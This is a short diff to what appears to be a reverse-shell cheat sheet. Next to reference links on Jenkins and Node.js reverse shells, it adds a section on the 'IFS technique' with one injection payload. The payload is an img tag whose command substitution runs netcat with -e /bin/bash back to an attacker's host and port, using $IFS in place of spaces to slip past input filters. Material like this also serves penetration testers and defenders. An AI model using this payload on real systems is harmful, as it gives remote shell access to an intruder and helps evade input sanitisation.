@@ -347,3 +347,8 @@ https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-s
 https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/  
 
 > To learning more about Node JS navigate to https://www.youtube.com/watch?v=W6NZfCO5SIk, thanks to frostb1te for providing me the link.
+
+### IFS Technique to replace spaces
+```
+<img src=http://localhost/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LPORT>')>
+```
